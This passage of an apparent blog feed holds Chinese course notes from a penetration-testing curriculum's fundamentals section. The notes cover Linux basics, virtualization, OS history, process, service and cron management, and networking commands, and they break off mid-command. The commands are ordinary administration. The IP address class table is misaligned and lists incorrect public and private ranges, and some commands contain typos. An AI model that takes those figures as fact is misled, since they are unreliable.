        <content type="html"><![CDATA[<p><a name="tQXOC"></a></p><h2 id="什么是虚拟机"><a href="#什么是虚拟机" class="headerlink" title="什么是虚拟机?"></a>什么是虚拟机?</h2><p><a name="WxFSr"></a></p><h3 id="如何在一台电脑上安装多个操作系统"><a href="#如何在一台电脑上安装多个操作系统" class="headerlink" title="如何在一台电脑上安装多个操作系统?"></a>如何在一台电脑上安装多个操作系统?</h3><p>Virtual Machine。<br>虚拟机/物理机</p><p><a name="Zo9Sg"></a></p><h1 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h1><p>虚拟机软件: VMware Workstation、VirtualBox、Virtual PC、Citrix Xen Desktop、Parallels Desktop(MacOS)<br>虚拟化技术: Xen、OpenVZ、 KVM、Hyper-V <a name="vW8Sj"></a></p><h1 id="虚拟机工作原理"><a href="#虚拟机工作原理" class="headerlink" title="虚拟机工作原理"></a>虚拟机工作原理</h1><pre><code>                                                                              虚拟机                虚拟机&lt;br /&gt;                                                                               应用程序              应用程序&lt;br /&gt;                                                                            运行时环境             运行时环境&lt;br /&gt;  应用程序     应用程序                                       虚拟机操作系统      虚拟机操作系统&lt;br /&gt;运行时环境   运行时环境                                                   虚拟机监视器&lt;br /&gt;                                          物理机操作系统&lt;br /&gt;                                                硬件</code></pre><p><a name="ETQdU"></a></p><h1 id="虚拟机使用场景"><a href="#虚拟机使用场景" class="headerlink" title="虚拟机使用场景"></a>虚拟机使用场景</h1><ol><li>运行特定版本操作系统</li><li>隔离物理机，测试用</li><li>提升资源利用率</li></ol><p>Linux自带的虚拟化技术<br>Kernel-based Virtual Machine ( KVM)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-2.3-Linux内核与发行版</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-3-2.3-linux-nei-he-yu-fa-xing-ban/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-3-2.3-linux-nei-he-yu-fa-xing-ban/</url>
      
        <content type="html"><![CDATA[<p><a name="IFuqa"></a></p><h1 id="Linux内核"><a href="#Linux内核" class="headerlink" title="Linux内核"></a>Linux内核</h1><ul><li>内核:设备驱动、文件系统、进程管理、网络通信…</li><li><a href="https://www.kernel.org/">https://www.kernel.org/</a></li></ul><!----><pre><code>uname -acat /proc/version</code></pre><p><a name="xwAaM"></a></p><h1 id="内核版本号"><a href="#内核版本号" class="headerlink" title="内核版本号"></a>内核版本号</h1><p>Linux 3.10.0-514.el7.x86 64</p><ul><li>Linux内核名</li><li>第一个组数字: 3, 主版本号</li><li>第二个组数字: 10, 次版本号</li><li>第三个组数字: 0, 修订版本号</li><li>第四个组数字: 514, 发行版本的补丁版本</li><li>el7:表示正在使用的内核是RedHat / CentOS系列发行版</li></ul><p>专用内核( Red Hat Enterprise Linux)</p><ul><li>x86_ 64:采用的是64位的CPU</li></ul><p><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></p><p><a name="cI69P"></a></p><h1 id="发行版Distribution"><a href="#发行版Distribution" class="headerlink" title="发行版Distribution"></a>发行版Distribution</h1><p><code>cat /etc/redhat-releaser</code><br>CentOS Linux release 7.3.1611 (Core)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-2.2-Linux诞生与分支</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-2-2.2-linux-dan-sheng-yu-fen-zhi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-2-2.2-linux-dan-sheng-yu-fen-zhi/</url>
      
        <content type="html"><![CDATA[<p><a name="GVWl0"></a></p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ul><li>Linux is not UNIX</li><li>Version 7’Unix-闭源</li><li>Andrew S. Tanenbaum: mini-UNIX= Minix</li><li>Linus Benedict Torvalds: GNU/Linux</li><li>Unix-like systems</li><li>商业/开源;硬件兼容性</li></ul><p><a name="ymoSw"></a></p><h1 id="Unix主要分支"><a href="#Unix主要分支" class="headerlink" title="Unix主要分支"></a>Unix主要分支</h1><p><img src="../../../../assets/wcpkgksaqqdenytg_cfq9xz/1668390129078-514c756f-50ec-4698-ad33-1f39e68539ca.png" alt="image.png"><br>&amp;#x20;       &amp;#x20;<br><a href="https://upload.wikimedia.org/wikipedia/commons/1/1b/Linux_Distribution_Timel%20ine.svg">linux分支</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-2.1-操作系统简史</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-1-2.1-cao-zuo-xi-tong-jian-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-2-linux-cao-zuo-xi-tong-jie-shao/ke-shi-1-2.1-cao-zuo-xi-tong-jian-shi/</url>
      
        <content type="html"><![CDATA[<p><a name="IJKHw"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><p>1、操作系统简史<br>2、Linux诞生与分支<br>3、Linux内核与发行版</p><p><a name="SEgXO"></a></p><h1 id="40年代"><a href="#40年代" class="headerlink" title="40年代"></a>40年代</h1><p>ENIAC<br>穿孔卡片</p><p><a name="yGuH0"></a></p><h1 id="50年代"><a href="#50年代" class="headerlink" title="50年代"></a>50年代</h1><ul><li>计算机读取内存…编程语言、可重用代码、汇编程序、中断</li><li>批处理系统</li><li>1956第一个操作系统GM-NAA I/O <a name="dbpF2"></a></li></ul><h1 id="60年代"><a href="#60年代" class="headerlink" title="60年代"></a>60年代</h1><ul><li>多程序、多处理器操作系统、交互式操作</li><li>DOS: Disk Operating System</li><li>小型计算机、分时系统、虚拟内存和多处理、顺序作业系统、多作业系统</li><li>鼠标和UNIX操作系统</li><li>MULTICS (MULTiplexed Information and Computing System多路信息计算系统)</li><li>肯汤普森(Ken Thompson)</li><li>Unics (Uniplexed Information and Computing System 单路信息计算系统)</li></ul><p><a name="K6I72"></a></p><h1 id="70年代"><a href="#70年代" class="headerlink" title="70年代"></a>70年代</h1><ul><li>Ken Thompson (肯●汤普森)、Dennis Ritchie (丹尼斯●里奇)</li><li>C语言</li><li>Unix: 多用户，多任务处理、虚拟内存</li><li>数据网络和微处理器 <a name="BV5Ye"></a></li></ul><h1 id="Windows、MacOS"><a href="#Windows、MacOS" class="headerlink" title="Windows、MacOS"></a>Windows、MacOS</h1><ul><li>MicroSoft: QDOS–MS-DOS</li><li>Apple: Macintosh+ System 1.0</li><li>1985年Windows 1.0 <a name="AMHnO"></a></li></ul><h1 id="Xerox"><a href="#Xerox" class="headerlink" title="Xerox"></a>Xerox</h1><p>施乐(Xerox) 奥托(Alto) 一John Ellenby</p><p><a name="h7xq6"></a></p><h1 id="Linux图形界面"><a href="#Linux图形界面" class="headerlink" title="Linux图形界面"></a>Linux图形界面</h1><p>KDE、GNOME、Xfce、LXDE、MATE</p><blockquote><p>echo $DESKTOP_SESSION<br>echo $GDMSESSION<br>ps -A | egrep -i “gnome|kde|mate|cinnamon|lx|xfceljwm”</p></blockquote><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[~/Desktop]└─# echo $DESKTOP_SESSION                                 lightdm-xsession<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[~/Desktop]└─# echo $GDMSESSION            lightdm-xsession<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿guoyx)-[~/Desktop]└─# ps -A | egrep -i "gnome|kde|mate|cinnamon|lx|xfceljwm"    110 ?        00:00:00 kdevtmpfs   1182 ?        00:00:00 polkit-gnome-au  71326 ?        00:00:00 gnome-keyring-d  71338 ?        00:00:00 gnome-keyring-d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-12-Linux系统状态管理</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-12-xi-tong-zhuang-tai-guan-li/ke-shi-1-12-linux-xi-tong-zhuang-tai-guan-li/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-12-xi-tong-zhuang-tai-guan-li/ke-shi-1-12-linux-xi-tong-zhuang-tai-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="MluS0"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>查看系统信息</li><li>进程管理</li><li>内存使用情况</li><li>磁盘使用情况</li><li>定时任务</li></ol><p><a name="ow2y5"></a></p><h1 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h1><p>1.日期时间<br><code>date</code>时间</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# date "+%Y-%m-%d %H:%M:%S"2022-11-14 01:18:46</code></pre><p><code>cal</code> 日历</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# cal   November 2022      Su Mo Tu We Th Fr Sa         1  2  3  4  5   6  7  8  9 10 11 12  13 14 15 16 17 18 19  20 21 22 23 24 25 26  27 28 29 30     </code></pre><p><code>uptime</code> 开机启动多少时间</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# uptime 01:21:49 up 18:42,  2 users,  load average: 0.00, 0.00, 0.00</code></pre><p><code>w</code>显示目前登入系统的用户信息</p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# w 01:22:04 up 18:42,  2 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty7     :0               Sun06   18:42m  2:02   2:02  /usr/lib/xorg/Xorgkali     pts/0    192.168.31.119   00:25    0.00s  0.45s  0.04s sshd: kali [priv]</code></pre><p>2.系统版本<br><code>cat /etc/redhat-release</code></p><pre><code>[root@xuegod63 ~]# cat /etc/redhat-releaseCentOS Linux release 7.9.2009 (Core)</code></pre><p><code>uname -a</code></p><pre><code>[root@xuegod63 ~]# uname -aLinux xuegod63.cn 3.10.0-1160.80.1.el7.x86_64 #1 SMP Tue Nov 8 15:48:59 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p><code>cat /proc/version</code></p><pre><code>[root@xuegod63 ~]# cat /proc/versionLinux version 3.10.0-1160.80.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Tue Nov 8 15:48:59 UTC 2022</code></pre><p><a name="RRRQj"></a></p><h1 id="程序、进程、服务"><a href="#程序、进程、服务" class="headerlink" title="程序、进程、服务"></a>程序、进程、服务</h1><ol><li>程序 program</li><li>进程 process</li><li>服务 service</li></ol><p><code>systemctl list-unit-files |grep mysql</code><br><code>cat /etc/services |grep mysql</code> <a name="LAUyq"></a></p><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><ol><li>前台运行 ./xxx</li><li>后台运行 nohup ./xxx &amp; <a name="GdKgK"></a></li></ol><h2 id="查看进程top"><a href="#查看进程top" class="headerlink" title="查看进程top"></a>查看进程top</h2><p><img src="../../../../assets/sz2bq1c30ov5kna7_unc00d/1668408271232-cbf3da58-1d61-4a0e-a544-8a3a34e74022.png" alt="image.png"> <a name="kjRle"></a></p><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>全拼: process status</p><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>-a</td><td>显示所有进程，包括其他用户的进程;</td></tr><tr><td>-u</td><td>选择有效的用户id或者是用户名;</td></tr><tr><td>-x</td><td>显示没有控制终端的进程，同时显示各个命令的具体路径</td></tr><tr><td>-e</td><td>显示所有的进程，和-A的效果一样;</td></tr><tr><td>-f</td><td>显示更完整;通常与-e一起用;</td></tr></tbody></table><p><a name="MlmKr"></a></p><h3 id="ps-ef"><a href="#ps-ef" class="headerlink" title="ps -ef"></a>ps -ef</h3><p><img src="../../../../assets/sz2bq1c30ov5kna7_unc00d/1668408710813-5942bcd8-dddb-4dc3-8cad-8f19ffd19424.png" alt="image.png"><br><code>ps -ef | grep mysql</code> <a name="rOLJH"></a></p><h3 id="ps-aux"><a href="#ps-aux" class="headerlink" title="ps -aux"></a>ps -aux</h3><p><img src="../../../../assets/sz2bq1c30ov5kna7_unc00d/1668408800532-c65b9d5e-8abf-4f92-bc34-db6fda345c17.png" alt="image.png"> <a name="PqMmO"></a></p><h3 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h3><p><code>pstree -p</code><br><code>pstree mysql</code><br><code>pstree -p | grep ssh</code></p><p><a name="nCr8d"></a></p><h2 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h2><p>systemctl</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>systemctl status * .service</td><td>查看所有服务状态</td></tr><tr><td>systemctl start mysqld.service</td><td>启动服务</td></tr><tr><td>systemctl restart mysqld.service</td><td>重启服务</td></tr><tr><td>systemctl stop mysqld.service</td><td>停止服务</td></tr><tr><td>systemctl enable mysqld.service</td><td>开机启动服务</td></tr><tr><td>systemctl disable mysqld.service</td><td>停止开机启动</td></tr></tbody></table><p><a name="j1On7"></a></p><h3 id="systemctl和service"><a href="#systemctl和service" class="headerlink" title="systemctl和service"></a>systemctl和service</h3><table><thead><tr><th>daemon命令</th><th>systemctl命令</th></tr></thead><tbody><tr><td>service [服务] start</td><td>systemctl start [unit type]</td></tr><tr><td>service [服务] stop</td><td>systemctl stop [unit type]</td></tr><tr><td>service [服务] restart</td><td>systemctl restart [unit type]</td></tr></tbody></table><p><a name="Bn7VN"></a></p><h2 id="停止程序"><a href="#停止程序" class="headerlink" title="停止程序"></a>停止程序</h2><table><thead><tr><th>信号量</th><th>含义</th><th>服务停止</th></tr></thead><tbody><tr><td>0</td><td>EXIT</td><td>程序退出时收到该信息</td></tr><tr><td>1</td><td>HUP</td><td>挂掉电话线或终端连接的挂起信号，这个信号也会造成某些进程在没有终止的情况下重新初始化</td></tr><tr><td>2</td><td>INT</td><td>表示结束进程，但并不是强制性的，常用的”Ctrl+C”组合键发出就是一个kill -2的信号</td></tr><tr><td>3</td><td>QUIT</td><td>退出</td></tr><tr><td>9</td><td>KILL</td><td>杀死进程，即强制结束进程</td></tr><tr><td>11</td><td>SEGV</td><td>段错误</td></tr><tr><td>15</td><td>TERM</td><td>正常结束进程，是kill命令的默认信号</td></tr></tbody></table><p><code>kill -9</code> <a name="ewrNN"></a></p><h1 id="free显示内存的使用情况"><a href="#free显示内存的使用情况" class="headerlink" title="free显示内存的使用情况"></a>free显示内存的使用情况</h1><p><code>free</code>显示内存的使用情况<br><code>free -h</code>可视化<br><code>free -m</code>以单位兆显示<br><img src="../../../../assets/sz2bq1c30ov5kna7_unc00d/1668412759111-ef739fe3-2bc3-41a5-8859-a9c4e80bdee8.png" alt="image.png"></p><p><a name="BAnsX"></a></p><h1 id="磁盘使用情况"><a href="#磁盘使用情况" class="headerlink" title="磁盘使用情况"></a>磁盘使用情况</h1><p><code>du</code><br>全拼: disk usage</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>du /usr</td><td>显示使用情况</td></tr><tr><td>du -h /usr</td><td>–human-readable用恰当的单位</td></tr><tr><td>du -h /root –max-depth=1</td><td>加上层级限制</td></tr><tr><td>du -h –max-depth=1</td><td>sort -hr</td></tr><tr><td>du -ah /root</td><td>sort-hr</td></tr><tr><td>du -ah –exclude=”<em>/.</em>“ .</td><td>排除隐藏目录</td></tr><tr><td>du -kt 10M ./*</td><td>找出10M以上的文件</td></tr></tbody></table><p><a name="el8iA"></a></p><h2 id="综合命令-sar"><a href="#综合命令-sar" class="headerlink" title="综合命令 sar"></a>综合命令 sar</h2><p>全拼: system activity reporter</p><pre><code>[root@xuegod63 ~]# sarLinux 3.10.0-1160.80.1.el7.x86_64 (xuegod63.cn) 2022年11月14日 _x86_64_(4 CPU)09时49分56秒       LINUX RESTART09时50分02秒     CPU     %user     %nice   %system   %iowait    %steal     %idle10时00分01秒     all      0.69      0.12      1.39      0.10      0.00     97.7110时10分01秒     all      0.12      0.00      0.25      0.01      0.00     99.6310时20分01秒     all      0.12      0.00      0.24      0.00      0.00     99.6410时30分01秒     all      0.11      0.00      0.28      0.01      0.00     99.6010时40分01秒     all      0.11      0.00      0.24      0.00      0.00     99.6510时50分01秒     all      0.12      0.00      0.24      0.01      0.00     99.6411时00分01秒     all      0.12      0.00      0.25      0.00      0.00     99.62</code></pre><p><code>%user</code>: 用于表示用户模式下消耗的CPU时间的比例;<br><code>%nice</code>: 通过nice改变了进程调度优先级的进程，在用户模式下消耗的CPU时间的比例;&amp;#x20;<br><code>%system</code>: 系统模式下消耗的CPU时间的比例;<br><code>%iowait</code>: CPU等待磁盘I/O导致空闲状态消耗的时间比例;<br><code>%steal</code>: 利用Xen等操作系统虚拟化技术，等待其它虚拟CPU计算占用的时间比例;<br><code>%idle</code>: CPU空闲时间比例。</p><p><a name="modlG"></a></p><h1 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h1><p>工具: crontab<br>全拼: cron table<br>Cron表达式:<br><a href="https://tool.lu/crontab">https://tool.lu/crontab</a><br><code>cat /etc/crontab</code> <a name="zTgOu"></a></p><h2 id="crontab命令"><a href="#crontab命令" class="headerlink" title="crontab命令"></a>crontab命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>crontab -u root -r</td><td>删除任务remove</td></tr><tr><td>crontab -u root time.cron</td><td>把文件添加到某个用户的任务</td></tr><tr><td>crontab -u root -l</td><td>列举任务list</td></tr><tr><td>crontab -u root -e</td><td>编辑任务edit</td></tr></tbody></table><p>示例脚本:&amp;#x20;<br><code>test.cron</code> 输出wuya666<br><code>time.cron</code> 打印时间 <a name="KGhMr"></a></p><h2 id="定时任务文件"><a href="#定时任务文件" class="headerlink" title="定时任务文件"></a>定时任务文件</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>/etc/crontab</td><td>管理文件</td></tr><tr><td>/var/spool/cron/</td><td>每个用户包括root的crontab任务</td></tr><tr><td>/etc/cron.d/</td><td>存放任何要执行的crontab文件或脚本</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-11-Linux网络管理</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-11-wang-luo-guan-li/ke-shi-1-11-linux-wang-luo-guan-li/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-11-wang-luo-guan-li/ke-shi-1-11-linux-wang-luo-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="laSCY"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>网络基本概念</li><li>网络配置文件</li><li>查看及配置网络</li><li>连通性探测</li><li>查看网络连接</li><li>域名相关</li><li>下载传输 <a name="UZI59"></a></li></ol><h1 id="物理地址-x2F-逻辑地址"><a href="#物理地址-x2F-逻辑地址" class="headerlink" title="物理地址/逻辑地址"></a>物理地址/逻辑地址</h1><ul><li>网卡</li><li>MAC地址(Media Access Control)媒体访问控制</li></ul><p>物理地址；厂家分配</p><ul><li>IP (Internet Protocal Address)互联网协议地址</li></ul><p>逻辑地址；可变；分私有和公有<br>192.168.142.132<br>47.106.11.166 <a name="EnK2X"></a></p><h2 id="公有私有"><a href="#公有私有" class="headerlink" title="公有私有"></a>公有私有</h2><p>局域网——使用私有 IP地址<br>互联网——使用公有 IP地址</p><table><thead><tr><th>公有IP地址的范围</th><th>私有IP地址的范围</th></tr></thead><tbody><tr><td>A类的公有IP:</td><td></td></tr><tr><td>1.0.0.0 - 9.255.255.255</td><td></td></tr><tr><td>11.0.0.0 - 126.255.255.255</td><td>A类私有IP地址:</td></tr><tr><td>10.0.0.0-10.255.255.255</td><td></td></tr><tr><td>B类的公有IP:</td><td></td></tr><tr><td>128.0.0.0-172.15.255.255</td><td></td></tr><tr><td>172.32.0.0-191.255.255.255</td><td>B类私有IP地址:</td></tr><tr><td>172.16.0.0-172.31.255.255</td><td></td></tr><tr><td>C类的公有IP:</td><td></td></tr><tr><td>192.0.0.0-192.168.255.255</td><td></td></tr><tr><td>192.168.0.0-233.255.255.255</td><td>C类私有IP地址:</td></tr><tr><td>192.168.0.0-192.168.255.255</td><td></td></tr></tbody></table><p><a name="Te0uP"></a></p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>NAT: Network Address Translation,网络地址转换<br><img src="../../../../assets/ot9vxkilc1d75ugu_ye6ggz/1668397723880-0514e2a8-ab5f-43dd-940e-73f6eae9e0eb.png" alt="image.png"></p><p><a name="AkRVV"></a></p><h2 id="IPv4、IPv6"><a href="#IPv4、IPv6" class="headerlink" title="IPv4、IPv6"></a>IPv4、IPv6</h2><p><img src="../../../../assets/ot9vxkilc1d75ugu_ye6ggz/1668398175237-5cb6fc6f-3fb3-4e73-8f03-90285b1e061c.png" alt="image.png"><br><a href="https://tool.520101.com/wangluo/ipjisuan/">https://tool.520101.com/wangluo/ipjisuan/</a></p><p>IPv4: 4个8位二进制，2^32=全部约42亿， 实际可用约25亿 <a name="LMduZ"></a></p><h3 id="公网IP地址的分配"><a href="#公网IP地址的分配" class="headerlink" title="公网IP地址的分配"></a>公网IP地址的分配</h3><p>NIC (Network Information Center)分配<br>ISP (网络业务提供商)、网络基础设施提供商</p><p>全中国一共有多少iP地址?<br><a href="https://www.eet-china.com/mp/a95961.html">https://www.eet-china.com/mp/a95961.html</a></p><p>IPv6是128位的，一共有2的128次方个 <a name="v70By"></a></p><h3 id="动态、静态IP"><a href="#动态、静态IP" class="headerlink" title="动态、静态IP"></a>动态、静态IP</h3><p>DCHP (Dynamic Host Configuration Protocol)动态<br>static静态</p><p><a name="ZR77L"></a></p><h3 id="127-0-0-1"><a href="#127-0-0-1" class="headerlink" title="127.0.0.1"></a>127.0.0.1</h3><p>环回地址(loop back)<br>可以ping通代表网卡安装正常 <a name="o1RaU"></a></p><h2 id="端口port"><a href="#端口port" class="headerlink" title="端口port"></a>端口port</h2><p>作用:区分程序<br>范围: 0-65535<br>系统端口，0到1023<br>用户端口，也称为注册端口，1024-49151<br>动态端口，也称为私有或临时端口，49152-65535 <a name="Z6NxG"></a></p><h2 id="域名Domain-Name"><a href="#域名Domain-Name" class="headerlink" title="域名Domain Name"></a>域名Domain Name</h2><p>作用:替代IP,方便识记<br>域名如何转换为IP: Domain Name System-DNS<br>域名:与IP的数量关系:多对一</p><p>localhost 域名指向环回地址127.0.0.1</p><blockquote><p>--http:// WWW. baidu. com:80 IP Apache<br>https: //WWW. baidu. com: 443<br>http协议的域名可省80，<br>https协议的域名可省443；<br>http:// WWW. baidu. com:8080</p></blockquote><p><a name="uufcp"></a></p><h3 id="Dns服务器地址"><a href="#Dns服务器地址" class="headerlink" title="Dns服务器地址"></a>Dns服务器地址</h3><p>114.114.114.114 国内三大运营商提供<br>8.8.8.8 谷歌公司提供</p><p>例如：<br>fofa.so 域名被封了，但ip不受影响<br>改成fofa.info</p><p><a name="nUdCT"></a></p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p><a href="http://www.baidu.com/">www.baidu.com</a><br>map.baidu.com<br>news.baidu.com</p><p>bss.wuya.com 同一个IP 子目录 /wwwroot/bbs<br>blog.wuya.com 同一个IP 子目录 /wwwroot/blog<br>talk .wuya.com 同一个IP 子目录 /wwwroot/talk</p><p><a name="e6rtS"></a></p><h1 id="网络配置文件"><a href="#网络配置文件" class="headerlink" title="网络配置文件"></a>网络配置文件</h1><table><thead><tr><th>文件</th><th>作用</th></tr></thead><tbody><tr><td>/etc/sysconfig/network-scripts/ifcfg-ens33</td><td>网卡配置文件</td></tr><tr><td>/etc/sysconfig/network-scripts/ifcfg-lo</td><td>环回地址配置文件</td></tr><tr><td>/etc/hosts</td><td>主机名与IP的映射</td></tr><tr><td>/etc/resolv.conf</td><td>DNS配置，由ens33自动覆盖</td></tr></tbody></table><p><a name="ZAcJX"></a></p><h1 id="查看及配置网络"><a href="#查看及配置网络" class="headerlink" title="查看及配置网络"></a>查看及配置网络</h1><p><a name="VXCMW"></a></p><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>全拼: network interfaces configuring<br>位于net-tools工具包<br>可以动态配置网络参数<br>其他选项参数: <a href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p><p><a name="D7aMr"></a></p><h2 id="ifconfig和ip"><a href="#ifconfig和ip" class="headerlink" title="ifconfig和ip"></a>ifconfig和ip</h2><p><img src="../../../../assets/ot9vxkilc1d75ugu_ye6ggz/1668402998435-d63f3f64-51ea-41da-9725-8293a090d92e.png" alt="image.png"></p><p><a name="fP7kM"></a></p><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>位于iproute工具包<br>添加设备、启动停止网络设备、设置IP、 设置网关……<br>其他选项参数: <a href="https://www.linuxcool.com/">https://www.linuxcool.com/</a></p><p><a name="Y9apQ"></a></p><h1 id="连通性探测"><a href="#连通性探测" class="headerlink" title="连通性探测"></a>连通性探测</h1><p><a name="xYpLE"></a></p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>全拼: Packet Internet Groper,因特网包探索器<br>ping baidu.com<br>ping 192.168.142.151 <a name="uZXBt"></a></p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>远程登录<br>telnet bbs.newsmth.net</p><p>探测端口<br>telnet 192.168.142.132 80<br>telnet 192.168.142.132 22 <a name="aNbUg"></a></p><h1 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h1><p><a name="Vc71s"></a></p><h2 id="netstat-ss"><a href="#netstat-ss" class="headerlink" title="netstat (ss)"></a>netstat (ss)</h2><p>全拼: network statistics</p><p>查看程序的网络连接情况:<br>netstat -ap | grep ssh</p><p>查看端口的网络连接情况:<br>netstat -ap | grep 3306</p><p><a name="NFwvh"></a></p><h1 id="域名相关"><a href="#域名相关" class="headerlink" title="域名相关"></a>域名相关</h1><p><strong>nslookup</strong><br><code>nslookup baidu.com</code><br>A记录: IP地址<br>CNAME:域名别名<br>MX:邮件服务器</p><p><strong>dig (domain information groper)</strong><br><code>dig baidu.com</code><br><code>dig www.xtu.edu.cn A +noall + answer</code><br><code>dig www.xtu.edu.cn MX + noall + answer</code><br><code>dig www.xtu.edu.cn NS + noall + answer</code></p><p><strong>host</strong><br><code>host baidu.com</code><br><code>host -t MX www.baidu.com</code></p><pre><code>┌──(root㉿guoyx)-[/home/kali]└─# host -t MX www.baidu.comwww.baidu.com is an alias for www.a.shifen.com.</code></pre><p><a name="yD04Y"></a></p><h1 id="下载传输"><a href="#下载传输" class="headerlink" title="下载传输"></a>下载传输</h1><p><a name="uvETu"></a></p><h2 id="常规方式"><a href="#常规方式" class="headerlink" title="常规方式"></a>常规方式</h2><p>Xshell拖曳——上传<br>xftp——双向，或者Filezilla、 FlashFTP<br>sz file name——下载<br>rz——上传<br>vmtools拖动——传入<br>QQ——双向 <a name="jAI0x"></a></p><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><blockquote><p>wget <a href="https://download.redis.io/releases/redis-6.0.9.tar.gz">https://download.redis.io/releases/redis-6.0.9.tar.gz</a></p></blockquote><p><code>wget -O</code>改名字</p><blockquote><p>wget -O redis.tar.gz <a href="https://download.redis.io/releases/redis-6.0.9.tar.gz">https://download.redis.io/releases/redis-6.0.9.tar.gz</a></p></blockquote><p><code>wget -c </code>断点续传<br><code>wget -b</code> 后台下载<br><code>wget -i </code>filelist.txt 同时下载多个<br><code>tail -f wget-log</code> 查看下载进度</p><p><a name="SD8bn"></a></p><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><p>全拼: Secure Copy<br><code>scp 1.txt root@192.168.142.66:/tmp</code><br><code>scp -r folder root@192.168.142.66:/tmp</code></p><p><a name="RArG6"></a></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>全拼: Client URL<br><code>curl https://www.baidu.com &gt; page.html</code><br><code>curl -X POST -d 'a=1&amp;b= nihao' URL</code><br><code>curl -H "Content- Type: application/json" -X POST -d '{" abc":123,"bcd":"nihao"}' URL</code></p><p><a name="l6Syi"></a></p><h1 id="防火墙Firewall"><a href="#防火墙Firewall" class="headerlink" title="防火墙Firewall"></a>防火墙Firewall</h1><p><a name="CQa2j"></a></p><h2 id="iptables工具"><a href="#iptables工具" class="headerlink" title="iptables工具"></a>iptables工具</h2><ul><li>启动防火墙</li></ul><p><code>systemctl start firewalld</code></p><ul><li>查看已开放的端口</li></ul><p><code>firewall-cmd 